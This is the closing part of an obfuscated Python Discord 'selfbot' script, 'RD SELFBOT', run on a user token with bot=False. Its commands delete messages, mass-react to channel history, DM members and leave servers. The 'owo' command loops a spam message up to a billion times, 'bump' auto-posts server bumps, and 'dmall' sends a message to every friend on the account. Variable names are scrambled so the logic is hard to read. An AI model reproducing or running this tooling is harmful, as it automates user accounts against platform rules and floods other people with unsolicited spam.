async def massreact (O0OOOOO0O0O00OOO0 ,O00O0OOO0OO0OO000 ):#line:906
    await O0OOOOO0O0O00OOO0 .message .delete ()#line:907
    O0000O0OO0O00OOOO =await O0OOOOO0O0O00OOO0 .message .channel .history (limit =100 ).flatten ()#line:908
    for OOOO0OOO00OO000OO in O0000O0OO0O00OOOO :#line:909
        await OOOO0OOO00OO000OO .add_reaction (O00O0OOO0OO0OO000 )#line:910
@client .command ()#line:913
async def dm (O000O0O00O0OO0O00 ,O0O000O00OOO0OO00 :discord .Member ,*,message ):#line:914
    await O000O0O00O0OO0O00 .message .delete ()#line:915
    O0O000O00OOO0OO00 =client .get_user (O0O000O00OOO0OO00 .id )#line:916
    if O000O0O00O0OO0O00 .author .id ==client .user .id :#line:917
        return #line:918
    try :#line:919
        await O0O000O00OOO0OO00 .send (message )#line:920
    except :#line:921
        pass #line:922
@client .command ()#line:925
async def embed (O0OO00OO0OO0O00O0 ,*,description ):#line:926
    OOO0O00000O0O0000 =discord .Embed (title ='RD SELFBOT',description =description )#line:927
    OOO0O00000O0O0000 .set_footer (text ='Created by Diosis Op')#line:928
    await O0OO00OO0OO0O00O0 .send (embed =OOO0O00000O0O0000 )#line:929
@client .command ()#line:932
async def poll (OOO0O0OOO00OOOO00 ,*,arguments ):#line:933
    await OOO0O0OOO00OOOO00 .message .delete ()#line:934
    OOO00OO0O0O0O0O00 =discord .utils .escape_markdown (arguments [str .find (arguments ,'msg:'):str .find (arguments ,'1:')]).replace ('msg:','')#line:935
    OOOO0OOO000OOO0OO =discord .utils .escape_markdown (arguments [str .find (arguments ,'1:'):str .find (arguments ,'2:')]).replace ('1:','')#line:936
    O0O00000O0O0O0000 =discord .utils .escape_markdown (arguments [str .find (arguments ,'2:'):]).replace ('2:','')#line:937
    OOO00OO0O0O0O0O00 =await OOO0O0OOO00OOOO00 .send (f"`Poll: {OOO00OO0O0O0O0O00}\nOption 1: {OOOO0OOO000OOO0OO}\nOption 2: {O0O00000O0O0O0000}`")#line:938
    await OOO00OO0O0O0O0O00 .add_reaction ('🅰')#line:939
    await OOO00OO0O0O0O0O00 .add_reaction ('🅱')#line:940
@client .command ()#line:943
async def leave (O0O00O0O0O0OOOOOO ,OO0O000O0OOO0OOO0 ):#line:944
    await client .get_guild (int (OO0O000O0OOO0OOO0 )).leave ()#line:945
    await O0O00O0O0O0OOOOOO .send (f"I left: {OO0O000O0OOO0OOO0}")#line:946
@client .command ()#line:949
async def hi (OO00000O00OOOOO00 ):#line:950
    await OO00000O00OOOOO00 .add_reaction (':xeodanceshorty:')#line:951
@client .command ()#line:953
async def owo (O0OO00000000OO0O0 ):#line:954
    for _OO00OO0O00OO0OO0O in range (1000000000 ):#line:955
        await O0OO00000000OO0O0 .send ("owo h")#line:956
        await asyncio .sleep (120 )#line:957
@client .command ()#line:959
async def bump (OO0O00O0000OOOOO0 ):#line:960
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:961
    await asyncio .sleep (7200 )#line:962
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:963
    await asyncio .sleep (7200 )#line:964
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:965
    await asyncio .sleep (7200 )#line:966
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:967
    await asyncio .sleep (7200 )#line:968
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:969
    await asyncio .sleep (7200 )#line:970
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:971
    await asyncio .sleep (7200 )#line:972
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:973
    await asyncio .sleep (7200 )#line:974
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:975
    await asyncio .sleep (7200 )#line:976
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:977
    await asyncio .sleep (7200 )#line:978
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:979
    await asyncio .sleep (7200 )#line:980
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:981
    await asyncio .sleep (7200 )#line:982
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:983
    await asyncio .sleep (7200 )#line:984
    await OO0O00O0000OOOOO0 .send ('!d bump')#line:985
@client .command ()#line:988
async def dmall (OO00000000000O000 ,*,message ):#line:989
    for O00OO00OO0O00000O in client .user .friends :#line:990
        try :#line:991
            await O00OO00OO0O00000O .send (message )#line:992
            print (f"messaged: {O00OO00OO0O00000O.name}")#line:993
        except :#line:994
            print (f"couldnt message: {O00OO00OO0O00000O.name}")#line:995
@client .command ()#line:999
async def rdop (O0OOOO00O0O0O000O ):#line:1000
    await O0OOOO00O0O0O000O .send ('RD OP')#line:1001
keep_alive ()#line:1003

client.run(token , bot = False)
